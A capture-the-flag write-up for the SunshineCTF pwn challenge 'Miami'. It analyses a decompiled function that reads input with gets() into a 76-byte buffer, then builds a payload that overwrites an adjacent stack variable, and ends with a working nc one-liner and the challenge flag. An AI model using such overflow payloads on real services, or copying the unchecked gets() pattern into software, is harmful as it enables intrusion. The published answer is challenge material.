Miami
auther:
Oreomeister
Description:
Dexter is the prime suspect of being the Bay Harbor Butcher, we break into his login terminal and get the proof we need!


nc chal.sunshinectf.games 25601

---

# Miami — Writeup

**Category:** pwn / binary exploitation

**Challenge summary**

Dexter is suspected to be the Bay Harbor Butcher. The binary `miami` asks for "Dexter's password"; with a wrong password it prints `Invalid credentials!`, but if we manage to control an internal variable the program prints `Access granted...` and reveals the proof/flag. The binary is a 64-bit PIE ELF and contains a vulnerable `vuln()` function using `gets()`.

---

## Reconnaissance

Run some basic commands to learn about the target:

```
file miami
# ELF 64-bit LSB PIE executable, x86-64, dynamically linked

strings ./miami
# shows functions: gets, puts, fopen, fread, read_flag, and a reference to flag.txt
```

The presence of `gets` in the strings strongly suggests a classic stack-based buffer overflow vulnerability.

---

## Static analysis


using ghidra:

void vuln(void)

{
  char local_58 [76];
  int local_c;
  
  local_c = -0x21524111;
  local_58[0] = '\0';
  local_58[1] = '\0';
  local_58[2] = '\0';
  local_58[3] = '\0';
  local_58[4] = '\0';
  local_58[5] = '\0';
  local_58[6] = '\0';
  local_58[7] = '\0';
  local_58[8] = '\0';
  local_58[9] = '\0';
  local_58[10] = '\0';
  local_58[0xb] = '\0';
  local_58[0xc] = '\0';
  local_58[0xd] = '\0';
  local_58[0xe] = '\0';
  local_58[0xf] = '\0';
  local_58[0x10] = '\0';
  local_58[0x11] = '\0';
  local_58[0x12] = '\0';
  local_58[0x13] = '\0';
  local_58[0x14] = '\0';
  local_58[0x15] = '\0';
  local_58[0x16] = '\0';
  local_58[0x17] = '\0';
  local_58[0x18] = '\0';
  local_58[0x19] = '\0';
  local_58[0x1a] = '\0';
  local_58[0x1b] = '\0';
  local_58[0x1c] = '\0';
  local_58[0x1d] = '\0';
  local_58[0x1e] = '\0';
  local_58[0x1f] = '\0';
  local_58[0x20] = '\0';
  local_58[0x21] = '\0';
  local_58[0x22] = '\0';
  local_58[0x23] = '\0';
  local_58[0x24] = '\0';
  local_58[0x25] = '\0';
  local_58[0x26] = '\0';
  local_58[0x27] = '\0';
  local_58[0x28] = '\0';
  local_58[0x29] = '\0';
  local_58[0x2a] = '\0';
  local_58[0x2b] = '\0';
  local_58[0x2c] = '\0';
  local_58[0x2d] = '\0';
  local_58[0x2e] = '\0';
  local_58[0x2f] = '\0';
  local_58[0x30] = '\0';
  local_58[0x31] = '\0';
  local_58[0x32] = '\0';
  local_58[0x33] = '\0';
  local_58[0x34] = '\0';
  local_58[0x35] = '\0';
  local_58[0x36] = '\0';
  local_58[0x37] = '\0';
  local_58[0x38] = '\0';
  local_58[0x39] = '\0';
  local_58[0x3a] = '\0';
  local_58[0x3b] = '\0';
  local_58[0x3c] = '\0';
  local_58[0x3d] = '\0';
  local_58[0x3e] = '\0';
  local_58[0x3f] = '\0';
  local_58[0x40] = '\0';
  local_58[0x41] = '\0';
  local_58[0x42] = '\0';
  local_58[0x43] = '\0';
  printf("Enter Dexter\'s password: ");
  gets(local_58);
  if (local_c == 0x1337c0de) {
    puts("Access granted...");
    read_flag();
  }
  else {
    puts("Invalid credentials!");
  }
  return;
}
 ---


- There's a local buffer `char local_58[76];` (size = 76 bytes).
- There's an `int local_c;` placed after the buffer in the stack frame.
- The program calls `gets(local_58);` to read user input with no length check.
- Later the code checks `if (local_c == 0x1337c0de) { puts("Access granted..."); read_flag(); }`

This is a textbook *buffer overflow to overwrite a nearby stack variable* rather than return-address overwrite. The goal is to overwrite `local_c` with `0x1337c0de`.

On x86_64, integers are 4 bytes and the ABI and typical stack layout use little-endian for multi-byte values. Thus `0x1337c0de` in little-endian is the byte sequence: `\xde\xc0\x37\x13`.

---

## Exploitation plan

1. Fill the buffer with exactly 76 bytes (any bytes) to reach the saved area directly after `local_58`.
2. Overwrite the 4-byte `local_c` with the little-endian value `0x1337c0de`.
3. Send a newline to terminate input (since `gets()` reads until newline).
4. The program will then detect `local_c == 0x1337c0de` and print `Access granted...` and (depending on implementation) call `read_flag()` or open `flag.txt`.

**Payload layout** (bytes):

```
[A x 76] + [\xde\xc0\x37\x13] + [\n]
```

---

## One-line exploit (remote with nc)

Use this one-liner to send the payload to the remote service provided in the challenge:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xde\xc0\x37\x13" + b"\n")' | nc chal.sunshinectf.games 25601
```
sun{DeXtEr_was_!nnocent_Do4kEs_w4s_the_bAy_hRrb0ur_bu7cher_afterall!!}

---

